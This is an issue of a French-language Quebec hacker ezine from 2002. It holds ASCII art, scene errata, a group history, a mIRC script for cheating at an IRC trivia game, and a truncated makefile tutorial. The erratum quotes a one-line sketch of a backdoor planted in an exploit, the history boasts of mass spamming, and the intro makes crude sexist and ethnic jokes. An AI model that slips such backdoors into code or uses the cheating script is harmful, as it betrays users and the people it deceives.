---
title: "mindkind11"
ezine: "mindkind"
---

# mindkind11

**Ezine:** mindkind

<div className="ascii-content">

`````````````````````````
 
 __ _ ____                         __ _ ____          
|         \_________________ _ ___/         |     .---- --- --- ---------. .---- --- --- ---- -----.
;                                           |    /                       |/                        | 
|                                           |   /                        /                         |
|                                           |  /                        /                          |
|       ____________                        |_/_                       /                           | 
|      |_ _ ________|                       |   |                     /                            | 
|       _ __ _ _____   __ _________   __ ___|   |____                /_________                    |
|      |            | |            | |          |    |                   |     |   \          /    | 
|      |            | |            | |  _       |    |                   |     |  (o)        (o)   |  
|      |            | |     |      | | |_|      |    :_                  |     |                   | 
.      |___ ___ ____| |___ _|_ ____| |____ _____|    |_)                 |_____:        ||         |
|                                           |        |__)                :_____        o  o         \ 
|                                           |        :_)                 .     ;                     \
|                                           :        |_)                       | _   _   _   _   _ |\ \
.                                           !        |                   |     |/ \_/ \_/ \_/ \_/ \| \ \    
|                                           |                            |              qha      ,--./ /   
:              |             |              !        ;                              rectum crew |_    /                
;              |             :              |                            |           pyrofreak  |_   /              
|______________|_____________|______________|        !                   ;           mad quebec |___/                    
                                                                         |          immortal hack                
                                                     ;                   |        _   _   _   _   _    
 ______ _____ _ ___ ____    __ _______ __ __         |                   |       / \_/ \_/ \_/ \_/ | 
|                       |  /                |        |                   |      |                  |
;                       | /                 |        |                     __ __|                  |__ __
:                       |/                  '        |                    |                              | 
|                                          /         |                   :|                              |
.                                         /          |                   ||                              | 
|                                        /                               |'-- ----- -- -- - -------  ----'
|       _ ______ ___                    /   ____     |                   |             
|      |_ __________|                  /   |    |    ;                               
'       _ __ _ _____   _____ ___ __   /____|    |    |                        QuΘbec Underground E-zine 
|      |            | |            | |          |                        |           issue 11       
|      |            : |            | |  _       |    .                   '             aka
|      |            | |            | | |_|      |    |                   |          Mindkind11      
.      |_ _ ________| |___ _|_ ____| |____ _____|    :                   |         
|                                       \            '                   :
|                                        \      __ __|                   |__ _
|                       /\                \    |                              |
;                      :  \                \   |                              |
|                      |   \               '   |                              |
|_ __ ____________ ____|    \____ _______ _|   '------------ - ---------------'
"Mindkind11: Plus grand que jamais. || Le pΦre nowel existe pas, Mindkind si. "



AprΦs l'augmentation des  ventes faramineuses de  Mindkind 10, il n'a  pas  ΘtΘ
compliquΘ de convaincre le prΘsident de la caisse de dΘp⌠t de nous  faire  prΩt
des quelques 320  millions qu'ont co√tΘ  le budget d'effet  spΘciaux du  ezine.
Sans compter la paie  de tous les employΘs  de soutien  et  sous-traitants  tel
que le coursier qui porte les  post-its jaunes entre  les employΘs  de  soutien
et la prΘsidence et bien sur  entre la prΘsidence et les sous-traitants.   Sans
oublier la secrΘtaire blonde aux seins refaits, prΩte α servir  (la  secrΘtaire
ou les.. au  besoin) et pour  l'ambiance, les 3  mexicains qui  soutiennent  le
mur. Il va sans  dire que le budget  a ΘtΘ des mieux  managΘ. Et si  vous  vous
attendiez α quelque chose, eh bien vous Ωtes dans le champ, c bien mieux,  mΩme
si vous trouvez le contraire, c'est quand mΩme mieux. Et si τa fait pas   votre
affaire on a  aussi payΘ des  nano-pygmΘs, pour suivre  vos moindres faits   et
gestes, qui appellent les nano-policiers  au moindre signe de dΘgo√t  de  votre
part pour  vous maεtriser  par la  force, ainsi  que des  nano-contr⌠leurs   de
nano-policiers qui ont pour fonction de  s'assurer que le tout se dΘroule  dans
la plus grande  douleur possible. Il  ne vous reste  plus maintenant qu'a  vous
asssir confortablement et a savourer le produit.

Celui qui trouve le message encodΘ dans ce disclaim gagne 2 billets qui donnent
accΦs α des warp-gates nolisΘes pour les εles Fidji.



Erratum :
   Ceux qui sont moins habituΘs avec la langue franτaise se demandent
   certainement ce que c'est qu'un erratum.  Et bien, c'est un retour
   sur les erreures qu'on fait dans un pΘriodique.

   Dans un soucis d'offrir le meilleur produit possible,  nous  avons
   dΘcidΘ de revenir sur les erreurs commises  dans Mindkind, car oui
   Mindkind fait des erreurs, et on est loin d'Ωtre les  seuls,  mais
   on est peut-Ωtre les seuls qui l'avoue.   C'est  donc  pour  cette
   raison (et aussi α cause de notre arrogance lΘgendaire)  que  nous
   allons aussi corriger les autres.


Source : Mindkind 10 - Relatations sur le rectum crw
Erreur de type : trompΘ de personne
On a rapidement su qu'on a inclu une personne dans le tas, sans que τa soit  un
vrai membre du rectum shit. Il s'agit de UnixGods (lire UnixGoods). Au dΘbut on
pensait que  c'Θtait un  prΘtentieux, on  avait raison.  Par contre,  lui aussi
avait raison de l'Ωtre : cΘ pas un membre du rectum chose, et il est compΘtant.
C'est pour  cette raison  d'ailleurs qu'il  s'est join  α Mindkind, devenant un
allier plus qu'utile. M'enfin, on c'Θtait trompΘ car il se tenait  sur  le chan
des rectums pour les mΩmes raisons que nous.. les observer.
M'enfin, nos excuses.


Source : Mindkind 10 - Team teso Exploit
Erreur de type : peut-Ωtre une erreur de jugement
Et oui, encore une erreur sur  la personne. Cette fois ci, l'article  mentionne
que c'est le team TESO qui a backdoorer l'exploit... est-ce vrai? Si on regarde
dans le  passΘ il  y a  plusieurs sploits  de TESO  qui ont ΘtΘ backdoorΘs.. et
comme de faite TESO la dit sur le site.. comme nous faisait remarquer g463  "tu
penses que c gars la on du temps  α perdre α faire des doors?". Par contre,  on
peut se demander α quel point on peut trouver crΘdible un groupe de hack qui se
dΘfend de mettre des backdoors dans leurs exploits. S'ils le feraient vraiment,
probablement qu'ils diraient aussi que ce n'est pas eux, et le  fait  d'ajouter
    execl("/bin/echo", "backdoors", "backdoors > /etc/inetd", NOLL);
n'est pas tres long, vous en conviendrez. Finalement on place plus cette erreur
comme une grande incertitude sur le coupable.. parano∩a oblige.


Source : www.madquebec.org
Erreur de type : ramassis de fausse affaire
sur le site de madquebec (un groupe minable de la scene local), on peu lire
ceci :
"
  13/11/2002 - Le hackfest s'est bien deroule en fin de semaine.
  Effectivement le HackFest etait pas mal cool. Les anciens de l'underground 
  etait laá au grand complet.. Total Control ( un peu vieux mais tres bon ), 
  MindKind ( ca pas marcher fort fort leur affaires.. c'est dommage car il ont 
  du potenciel ), Northern Phun Co ( NPC... on oubli jamais ces classiques =P )
  IGA ( un autre classique ), et moi.. ( bon je faisait pitier mais bon ! ). Il
  n'y a pas eu vraiment de competition mais on peut dire que c'est une 
  reussite... attendons nous α plus gros l'annee prochaine !
"
Les vΘritΘs  dans cette  nouvelle la,  s'arrΩttent α  la premiΦre ligne. Err418
n'Θtait pas prΘsent (Total Control), Mindkind n'a pas participΘ, NPC Θtait  pas
vraiment la  non plus, et lui  on l'ignore, tellement  il est inconnu.  Si vous
voulez  vraiment savoir  ce qu'a ΘtΘ  le Hackfest, allez  lire l'article de  ce
ezine qui se rapporte directement α l'ΘvΦnement.


Source : Mindkind 11
Erreur de type : ne vous en faites pas les enfants.
Il est mentionnΘ dans le titre sous le logo du prΘsent ezine que
"le pΦre nowel existe pas".   C'est faux, le voici :

                      _____________    
                     /         \   \          __ _ __________ _ _____  
                    /           \   \        |                       |
                   / _________   \   |       |                       | 
                   \/         \  /   |       |  will  hack  to  get  | 
                   /   _   _   \/_   |       |  my fuckin raindeers  | 
                   |   O _ o   |  \_  \      |         BACK !        |
                   |  __(_)__  |    \ /      |                       |
                  /\_/       \_/\~~ / \      |_____ ___    _____ ____|
                 /     _____     \ ~\_/                |  |
               __|    /___ _\  ~~ |____ _ ______ _ _ __| _|
              /  |        \\ ~    |               | |   _)|
             /   \         \\ ~~  /               | |  |(_|
            /     \         ''~~ /    _ _ _____ _ |_|__|( |
           /       \__ _ __ ____/ .   /'               |  |
          /                      '     \               |  |
         /      /                      /               |__|
        /\____ /      .                |     
        \_____/                        |
       /     \                         '
      /   /\_/._ __ _ ________ ________/
      \_\_|   |                        | 
              |_ _ ____________ _____ _|       
               \                      /
                \                    /      
                 |                  |       
                 |        '         |
                 |_ _ ____|_ _ _____|       
                 |____ ___|___ _ ___|      
              ___|        |         |___       
             |            |             |      
              \_ ____ ___/ \__ ____ ___/          
                 




Nous rejoindre ? Quelle idΘe farfelue, si vous croyez toutefois que vous
avez une raison lΘgitime de le faire,  vous pouvez communiquer avec nous
via email α mindkind@mindkind.org ou par irc :
   Undernet     : #mindkind.org
   Dalnet       : #mindkind
   Efnet        : #mindkind
   OpenProjects : #mindkind

Si vous avez rien d'intΘressant α dire, on apprΘcierait que vous le
gardiez pour vous. Merci.



						          Wyzeman  &  LastCall_





                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  -----. 
     :    \ \ \__/ / /                    |_|\_\           \        \       : 
     ,     \/      \/ Table des anti-matiΦres               \   11   \      |
     :                                                       \________|     .
     ;                                                                      !
     : 11.01  Le Patrimoine lΘmurien                          LastCall_     .
     ; 11.02  You Make me File like an ASCII queen             acidmen      .
     : 11.03  40 PKP en show dans un trou de terre            init_null     :
     , 11.04  Googleownized                                      __2        :
     : 11.05  Review du Hackfest 2002                          Wyzeman      |
     : 11.06  Avez-vous dΘjα touchΘ un (Cisco) CLI?           LastCall_     .
     . 11.07  Le mirroir de l'Θvolution                       nothing94     !
     . 11.08  Un trio fmt svp                                   g463        .
     , 11.09  One day we should be root                        Wyzeman      |
     ; 11.10  C'est rare un raw socket sous Win                 Alice^      :
     : 11.11  Un hack XSS en pain d'Θpice                     MindFlayR     !
     : 11.12  You're younger now that in the end                c4ndu       |
     , 11.13  The Perl Anthology Tome 3                       LastCall_     .
     : 11.14  T'en veux-tu du code en vla!                      val0rz      !
     : 11.15  Le secret de la pierre philosophale             LastCall_     |
     ; 11.16  Run Micro$oft run                                 BoiSS       :
     . 11.17  "I'm in love with my sadness" **                  c4ndu       :
     ; 11.18  .hack_history                                    Mindkind     |
     :                                                        ________      .
     .                                                       \        \     !
     .                                                        \        \    .
     ;  ** Zero(smashing pumpkins)                             \        \   :
     :                                                          \        \  :
     '-- -----  - -------- --- --------- - --  ------------ --- -\        \-'
                                                                  \____ _ _\






      Dans la version "full" du ezine, vous retrouverez :
           - Mister T vs. Lamers, Part 1 : Au hackfest (histoire fictive)
           - Radio31337 - Les conseils pour hax0r.mp3  (conseils fictifs)
           - Mindkind en rubic snake



                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.01 Le patrimoine lΘmurien vous prΘsente :           \        \     !
     .             Histoire de Mindkind;                       \        \    .
     ;              industrialisation with attitude             \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

Septembre 2002 : Lancement de Mindkind 10
  C'est dans un bing bang que le ezine f√t lancΘ. Faut dire qu'on avait fait du
  MASS SPAM, alors τa la  bien marchΘ. De mΘmoire comme τa, on a eu dans le 150
  hits sur le  web si on compte  pas les dupes faits pour  faire hot. Bien  que
  complΦtement dΘgueulasse (spammer on join  sur #montreal genre haha) le  mass
  spam  nous  a permit  de  nous faire  connaεtre...  Pendant que  le  ezine se
  rΘpandait, le fameux rectum crew continuait de se faire fesser dessus car  la
  notoriΘtΘ lame du rectum crew Θtait maintenant ancrΘe dans la tΩte  de  tous.
  Il est α notΘ qu'aprΦs la parution du ezine,  UnixGods (maintenant __syscall)
  c'est  joint α  nous, car  lui aussi  Θtait contre  le RC  (voir mon  article
  Erratum). C'est grΓce α lui d'ailleurs que le rectum crew nous a proposΘ  une
  "trΩve", du genre "on touche pu  α vos channels, faites-nous une  liste". heh
  Pendant ce temps notre reste  de publique cible d'insulte (pyrofake),  disait
  que notre ezine Θtait α chier, s√rement  α cause qu'il avait du texte α  lire
  entre les ASCIIs. Une fois content d'avoir vu que toute la planΦte (heh) a lu
  notre ezine, tout le  monde  voulait  faire  un  deuxiΦme  ezine...  jusqu'au
  lendemain ou on oublia tout et on prit des petites vacances.
  
Octobre 2002 : un ti break qui dure pas trop longtemps..
  Bon ok, c'est clair  qu'on n'Θtait pas pour  sortir un deuxiΦme ezine  drette
  lα,  mais l'ambiance  Θtait α  son meilleur.  Tigerbalm fut  diagnostiquΘ  du
  syndrome  du  je-fais-des-bots-oui-des-bots.  LastCall_  tellement  en manque
  commenτa a coder un bot qui cruise α sa place.  g463 changea d'idΘe au  sujet
  du ezine (gee Θtait trΦs rΘbarbatif au sujet de faire un ezine), ce qui Θtait
  une preuve que finalement on suckait pas tant que τa... bien que productif et
  aisΘe, l'ambiance resta calme sur le channel, le ezine nous avait ΘpuisΘ.

Mi-Octobre 2002 : LastCall_ ya une grande yeule
  Constatant  que son  bot lui  avait pas  encore pognΘ  de chix,  Last  dΘcida
  d'Θcrire  quelque  chose  d'actuel  :  il  dΘbuta  la  fameuse  NewsLetter de
  Mindkind. Une fois par semaine, il s'enferma dans son appart en relisant  les
  logs de la semaine, et en  sortant des histoires ajoutΘes, le tout  en visant
  directement  les  personnes  sur #Mindkind  Undernet.  La  NewsLetter fut  un
  succΦs, et  le groupe  devint sur  le mΩme  beat. Ceux  qui n'avaient  pas la
  chance d'avoir le temps de suivre tout ce  qui  se  passait  sur  le  channel
  pouvait avoir les meilleurs moments,  et ceux qui avaient  du temps α  perdre
  pouvait lire sur  les diffΘrents sujets traitΘs  par  Last  qui  avaient  pas
  nΘcessairement rapport avec Mindkind, mais qui Θtaient quand mΩme pertinents.
  La NewsLetter grossissait de semaine en  semaine,  signe  que  le  groupe  se
  rΘactivait, on a mΩme vu une de 37ko (crissement long α lire heh).

Novembre 2002 : τa roule ma poule
  Last et init ont fait une autre radio (Θpisode 3) en direct de chicoutimi, ce
  fut un fun incroyable, avec ~15 users tout le long. Un best-of a ΘtΘ fait, et
  un  paquet  de personnes  (~100  sans jokes)  l'ont  downloadΘ. De  plus  les
  Mindkindiens  Θtaient rendus  totalement accros  au bot  faite par  Last  (le
  supposΘ  bot  qui  cruisait  sur  rΘseau-contact  pour  Last  Θtait  en  fait
  contr⌠lable via IRC..  hee hee). Le  monde failli virΘ  barge α regarder  des
  pics de chix α longueur de journΘe, mais le hackfest approchait. C'est  alors
  qu'un mΘga-trip de moi-jcode-des-sploits  commenτa, Wyzeman Θtait de  la fΩte
  avec __2 (pour  le hackfest justement)  et g463 pitonnais  sur #mindkind avec
  init_null, Wyze, [Funky] pis s√rement d'autre monde que j'oublie. C'Θtait  la
  folie furieuse.. Last Θtait en rush d'universitΘ pis de dΘpression, donc Wyze
  prit la relΦve une fois pour la NewsLetter. Le chan allait de bon train, mais
  le hosting de  mindkind.org Θtait slow  α cause de  la connexion de  Last qui
  Θtait rendu α 5mpbs en upload, pour 300 users :-/. C'est alors que WiL  sorti
  de l'ombre avec une proposition de  webhosting.   Wyzeman  avait  donc  lancΘ
  l'idΘe via la mailing list du ezine #11.

Fin Novembre 2002 : prΘliminaires
  Tout le monde Θtait excitΘ de partout, __2 commenτa un peu α suivre Mindkind,
  car  depuis le  prΘ-hackfest lui  pis Wyze  avaient beaucoup  fait  de  stock
  ensemble.. Last fit d'ailleurs un montage des pics disponible sur un site  de
  secours : http://www.geocities.com/agecal2/mr_t/.  Plut⌠t marrant, les autres
  continuaient leurs projets, qui  d'ailleurs sont tellement nombreux  que j'en
  ai de la misΦre α m'en souvenir... heureusement on Θtait pas pour tout perdre
  dans la brume.. car le ezine se faisait sentir...

DΘcembre 2002 : start of the ezine mania
  Tout  commenτait  α grouiller  en  fonction  de  sortir  un ezine,  plusieurs
  articles furent Θcrits,  plein de prΘdiction  d'articles, des codes  sources,
  etc. __2 a dΘcidΘ  que Mindkind c'Θtait bien,  qu'il ne voulait pas  en faire
  parti, mais  qu'il ne  voulait pas  gaspiller ses  articles sans les publier.
  C'est alors qu'on ouvrit la  porte du ezine aux "collaborateurs  extΘrieurs",
  mais le chan Θtait solidement fondΘ, et les personnes prΘsentes (si on compte
  les bots on  a un peak  de 27, une  moyenne de 16-20)  Θtaient rΘticentes aux
  nouveaux venus, cependant  acidmen sorti de  That 70s show  et est venu  nous
  Θpater avec de la jonglerie virtuelle. h3 eu une idΘe de BD et Last (avec son
  imagination de mongole) alla lui donner un petit coup de main et en un  autre
  coup de main (τa s'en vient violent la)  de la part de BoiSS, et un bot  XDCC
  pour spreader  notre stock  (dΘcidΘment le  new host  pour le  site web Θtait
  attendu) rapidement fut crΘΘ. Quand mΩme bien, on verra sa puissance de feu α
  la sortie  du prochain  ezine.. Cette  prochaine sortie  stressa le monde (en
  plus  de la  fin de session Univ/Cgep)  et l'atmosphΦre  devint violente  par
  moment. Cependant Last avait fini de pΘter sa dΘpression, et  Mindkind  Θtait
  trop solidement placΘ pour Ωtre dΘsancrΘ.

Nowel 2002 : un ezine comme cado dnowel stu pas cuuute
  C'est donc aprΦs  une phase d'assurance  qualitΘ (clin d'oeil GL ici) que  le
  ezine fut emballer spΘcialement pour  vous (tar cvf et gzip).  Contenant plus
  de cadeaux que le bas de nowel d'un Θthiopien de classe pauvre, voici donc le
  ezine Mindkind 11 α imprimer et α lire pendant les partys des fΩtes poches.



                                                      - La mΘmoire de LastCall_

            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /               lastcall@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'



      Voici un petit script mIRC qui vous permettra d'avoir l'air uber  Θlite
      sur #triviafr (trivia, vous savez ces jeux ou un bot pose une  question
      et dont le premier a la rΘponse fait x pts. Un jeux ou les BS excellent
      gΘnΘralement puisque les pts sont compilΘs par  semaine,  et  qu'un  BS
      dans une semaine a 168(7*24) heures de temps α perdre dans  un  trivia.
      Pas besoin de dormir quand on est BS. Enfin, voici  un  code  qui  vous
      permettra de leur faire rendre compte que vous Ωtes plus bright qu'eux.
      CrΘdit : rtfm` (via BoiSS)

------------------------------- 8< cut here 8< -------------------------------

on 1:text:*:#triviafr: {
  if Trivia isin $nick {
    if (Question isin $1- && ? isin $1-) { 
      set %triviafr.questions $1-    
      $read(questions.txt,s,$1-)
      if ($readn == 0)  { 
        set %triviafr.addquestion 1 
        set %triviafr.theanswer 
      } 
      else { 
        ;timer 1 $rand(1,4) msg $chan $read(reponses.txt,$readn) 
        set %triviafr.theanswer $read(reponses.txt,$readn)
        echo #triviafr JE CONNAIS LA R╔PONSE F9 POUR R╔PONDRE | echo #triviafr La reponse est %triviafr.theanswer
        set %triviafr.addquestion 0 
      }
    }
    if (=> isin $1- && => isin $1- && A GagnΘ !isin $1- && pour la derniΦre question !isin $1-) {
      set %triviafr.theanswer
      set %triviafr.temp $remove($1-,$left($1-,$pos($1-,>,4) +1))
      set %triviafr.temp2 $strip($remove($left(%triviafr.temp,$pos(%triviafr.temp,<,1) +2),<)) $+ ▼
      echo %triviafr.temp2
      if %triviafr.addquestion = 1  { write questions.txt %triviafr.questions | write reponses.txt %triviafr.temp2 }
    }
  }
}

menu channel {
  &TriviaFR
  .&Lines Number:/echo -a Questions lines : $lines(questions.txt) | echo -a Answers Lines : $lines(reponses.txt)
  .-
  .&TOP10:/msg #triviafr !top10
}

alias F9 { /msg #triviafr %triviafr.theanswer | set %triviafr.theanswer $chr(32) }
alias F8 { /msg #triviafr !!hint }
alias F7 { /msg #triviafr hehe.. google }

------------------------------- >8 cut here >8 -------------------------------




                                                       __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.02  PrΘsentation des makefiles                      \        \     !
     .             aka                                         \        \    .
     ;        You Make me File like an ASCII queen              \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     
                     
                   ^^^^^^^
                    ╥] []
                     ~~~~
                ____ | | _____  
                    ______  
                ||  |    |  ||
                ||  | A  |  ||          J`aimerais remercier tout spΘcialement 
               =====| Z  |=====         Micheline SansZavnir qui m'a endurΘ
                    | T  |              pendant mes longs cours de ... 
                  | | E  | |            ascii par correspondance.
                  | | K  | |
                    |_  _| 
                 /  ( || )  \
                / /(  ||)  \ \                
                /    (||  )  \
         \    / /     ||       \     /
         \ \ / /      || )    \ \  / / 
           \  / [01010101010]  \ / /   
                            En passant pour ceux qui ne savent pas encore
                            qu'est-ce que j'ai voulu dessiner c'est sans
                            importance... dites vous juste que je suis 31337 ;P




PrΘsentation des makefiles.


Vous aurez s√rement remarquΘ le  makefile livrΘ avec un programme  lorsque vous
l'avez compilΘ. ╔tant donnΘ le niveau de complexitΘ pouvant Ωtre atteint par un
fichier make,  vous pouvez  α juste  raison vous  demander : "pourquoi utiliser
make?"

Si vous imaginez un instant un projet composΘ de dizaine, voir de centaines  de
modules,  vous n'Ωtes  sans doute  pas trΦs  impatient de  recompiler tous  ces
modules chaque  fois que  vous modifiez  une ligne  de code.  Imaginez que vous
devriez  recompiler  entiΦrement  votre  noyau  α  la  main  aprΦs  une  petite
modification du code source. Il serait extrΩmement difficile de dΘterminer  les
compilations  α  omettre,  et   l'omission  de  la  compilation   indispensable
entraεnerait des  problΦmes. C'est  pourquoi la  commande make  est prΘcisΘment
destinΘe α ce genre de travail.

La  commande make  est capable  de tirer  des conclusions  sur les  dΘpendances
existantes entre divers fichiers. Elle possΦde d'autres fonctionnalitΘs qui  la
rendent  trΦs  puissante:   elle  sait  dΘfinir   des  macros  et   des  cibles
supplΘmentaires qui vous permettront d'Ωtre plus efficace.

Autre  avantage  des processus  make  : les  instructions  de compilation  sont
enregistrΘes dans  le fichier  make. Par  exemple, il  n'est pas  nΘcessaire de
mΘmoriser tous  les paramΦtres  de ligne  de commande  utilisΘs pour un projet.
Mieux encore, il n'est pas  nΘcessaire de documenter α l'intention  d'autrui ce
qui vous a servi α construire ce projet.


 >> Le Makefile

Lorsque vous  lancez la  commande make  sans dΘsigner  explicitement un fichier
make sur la ligne  de commande ( avec  le paramΦtre -f), l'utilitaire  GNU make
recherche trois noms de fichiers par  dΘfaut dans le rΘpertoire en cours,  dans
l'ordre suivant :

 1. GNUmakefile
 2. makefile
 3. Makefile


 >> Nommer le Makefile

Makefile
	Le nom Makefile avec la premiΦre lettre en majuscule convient le mieux,
	car lorsque vous listez vos fichiers, il figure en dΘbut de  la  liste.

GNUmakefile
        La documentation de  GNU make conseille  d'Θviter d'employer le  nom de
        fichier GNUmakefile. Vous ne devez  l'utiliser que si vous vous  servez
        des foncionnalitΘs  gΘrΘes par  la commande  GNU make.  Si le groupe de
        fonctionnalitΘs  employΘes  est  celui  make  UNIX  standard,  prΘfΘrez
        Makefile ou makefile.

makefile
        Lorsque le nom Makefile normal( avec un "M" majuscule) est utilisΘ,  il
        vous reste une possibilitΘ prΘalable. Si vous tΘlΘchargez un  paquetage
        de  sources  de l'Internet,  mais  dΘcouvrez que  vous  avez besoin  de
        modifier le Makefile fourni, vous pouvez tester vos modifications  sans
        toucher α ce Makefile:
	  1. Recopiez Makefile en makefile.
	  2. Editez makefile selon vos besoins.
	  3. Lancez la commande make. C'est makefile qui est utilisΘ α la
	     place de Makefile, car il est choisi en premier lorsqu'il existe.

 >> Les cibles des Makefile

La commande make commence par la notion de cible.
Lorsqu'elle possΦde un fichier make, la commande make doit traiter au moins une
cible de  ce fichier,  sinon rien  ne se  passe ;  et si le fichier ne contient
aucune cible, la commande make se plaint de la situation :

|#| bash$ make
|#| make: *** No targets. Stop.
|#| bash$

 >> DΘfinir les cibles
Le listing 1.0 suivant prΘsente un Makefile trΦs simple pourvu de trois cibles,
one, two, three, aux ligne 4, 7 et 10. Un nom de cible commence toujours au
dΘbut d'une ligne et est suivi du caractΦre deux-points.
 
	_= Listing (1.0) Makefile simple comportant trois cibles =_

|#| 1:   # Source: /home/acidmen/make/RCS/Makefile,v $
|#| 2:   
|#| 3:   
|#| 4:   one:
|#| 5:       @echo One
|#| 6:
|#| 7:   two:
|#| 8:       @echo two
|#| 9:   
|#| 10:  three:
|#| 11:       @echo three
|#| 12:
|#| 13:   # End Makefile

 

 >> Invoquer les cibles de Makefile

Pour invoquer une cible, il suffit d'indiquer son nom sur la ligne de commande.
Par exemple, la commande suivante invoque la cible two:

|#| bash$ make two
|#| Two
|#| bash$

Dans cette exemple, make ignore totalement les cibles one et three.


 >> Invoquer plusieurs cibles

Vous pouvez Θgalement invoquer plusieurs cibles sur une mΩme ligne
de commande:

|#| bash$ make three one two
|#| Three
|#| One
|#| Two
|#| bash$

Remarquez que les cibles sont traitΘes dans l'ordre des arguments de la
ligne de commande.

 >> Les cibles par dΘfaut
La commande make suppose que la toute premiΦre cible rencontrΘe dans le
fichier make est la cible par dΘfault. ConsidΘrez l'exemple suivant :

|#| bash$ make
|#| One
|#| bash$

make invoque la premiΦre cible rencontrΘe, one, α la ligne 4 du listing  (1.0).
Les noms de cible two et three sont considΘrΘes comme cibles de remplacement et
ne sont pas invoquΘes.


  >> Les noms de cible standards
Bien  qu'aucun  standard  formel  n'existe  pour  les  noms  de  cibles,   vous
rencontrerez quelques  conventions trΦs  rΘpandues lorsque  vous examinerez les
fichiers make de sources publiquement tΘlΘchargeables.

[*] _all_ est souvent utilisΘ comme  la premiΦre cible et par consΘquent  celui
par dΘfaut.  Il sert  habituellement α  nommer les  vrais noms  de cibles,  qui
peuvent Ωtre une ou plusieurs autre  cibles, qui peuvent Ωtre une ou  plusieurs
autres cibles. En utilisant cette cible, vous construisez le projet entier.

[*] _install_ est normalement employΘ pour installer un projet construit,  dans
ses rΘpertoires  dus systΦme  Linux, avec  les autorisations  correctes et  les
rΦgles de propriΘtΘ, en crΘant les sous-rΘpertoires si nΘcessaire.

[*]  _clean_ est  souvent utilisΘ  pour vous  permettre de  supprimer tous  les
fichiers objet (*.o), les fichiers core, et les autres fichiers provisoires qui
ont pu Ωtre crΘΘs lors de  la construction. Cette cible laisse les  exΘcutables
et les bibliothΦques construits en place.

[*] _clobber_  est  souvent  utilisΘ pour   supprimer les  cibles  construitent
du projet (en gΘnΘral, les  exΘcutables  et les bibliothΦques). Vous  supprimez
ces cibles pour reconstruire les fichiers de configuration du projet, etc.

[*] _distclean_  est souvent  utilisΘ par  les dΘveloppeurs  Linux et  GNU pour
nettoyer  complΦtement  le fichier  du  projet, sauf  en  ce qui  concerne  les
fichiers d'origine  distribuΘs sur  l'Internet. DΘpassant  clobber, cette cible
supprime les fichiers de configuration du projet, etc.


 >> Les dΘpendances
On accepte couramment des dΘpendances entre certains noms de cibles.
En tant que programmeur( ou progGameur? peut importe;), vous devez savoir que :

[*] La cible install dΘpend habituellement de all.
[*] La cible clobber dΘpend habituellement de clean.
[*] La cible distclean dΘpend habituellement de clobber.

Si  install  dΘpend  de la  cible  all,  le projet  est  d'abord  construit, si
nΘcessaire,  puis  l'installation tentΘe.  Sinon,  il n'existe  aucun  projet α
installer. Cependant, les logiciels sont souvent installΘs avec les  privilΦges
de root,  il n'est  par consΘquent  pas souhaitable  de construire votre projet
lorsque vous  opΘrez sous  root. Si  vous vous  en sentez  capable, vous pouvez
omettre cette dΘpendance dans votre projet.

La cible clobber  dΘpend de clean,  gΘnΘralement par commoditΘ.  La cible clean
s'occupe d'une partie  du travail et  il vous suffit  de dΘfinir le  reste pour
clobber. La cible distclean fonctionne sur le mΩme principe.


 >> DΘfinir les dΘpendances
Le listing (2.0) prΘsente un nouveau  fichier make auquel ont ΘtΘ ajoutΘes  des
dΘpendances. La cible three dΘpend de la cible two (ligne 10), et la cible  two
dΘpend α prΘsent de la cible one (ligne 7). Remarquez que les dΘpendances  sont
simplement indiquΘes aprΦs le nom de  la cible et le caratΦre deux-points.  Les
dΘpendances supplΘmentaires sont sΘparΘes par un ou plusieurs espaces. Au moins
un espace doit sΘparer le caractΦre deux points de la prmiΦre dΘpendances.

	_= Listing (2.0) Makefile avec dΘpendances=_

|#| 1:   #Source: /home/acidmen/make/RCS/Makefile,v $
|#| 2:
|#| 3:
|#| 4:   one:
|#| 5:      @echo One
|#| 6:
|#| 7:   two:	one
|#| 8:      @echo Two
|#| 9:   
|#| 10:  three: two
|#| 11:     @echo Three
|#| 12:
|#| 13:   # End Makefile

  
  >> Tester les dΘpendances des cibles
A prΘsent, lorsque vous invoquez le  fichier make du Listing (2.0) avec  le nom
de cible three, vous constatez que la commande make traite en rΘalitΘ les trois
cibles:

|#| bash$ make three
|#| One
|#| Two
|#| Three
|#| bash$

Cet ordre vous surprend-t-il? La cible  est exΘcutΘe la premiΦre, car la  cible
two dΘpend d'elle, et  la cible three dΘpend  de two. Par consΘquent,  avant de
pouvoir faire quoi  que ce soit  pour la cible  three, ses dΘpendances  doivent
Ωtre  satisfaites.  Bien  que  la cible  invoquΘe  soit  three,  la chaεne  des
dΘpendance est tell que make doit  invoquer one en premier pour satisfaire  les
deux autres cibles.

 >> DΘfinir les macros de make
La puissance des scripts shell tient en partie α leur capacitΘ d'utiliser et de
manipuler des  variables shell  et des  variables d'environnement.  La commande
make  possΦde  ce  genre  de  fonctionnalitΘ  et  sait  Θgalement  utiliser les
variables d'environnement.

Une macro make peut  contenir une valeur de  chaεne comme un nom  de fichier ou
une valeur de paramΦtre. Une macro  permet de ne dΘfinir qu'une seule  fois une
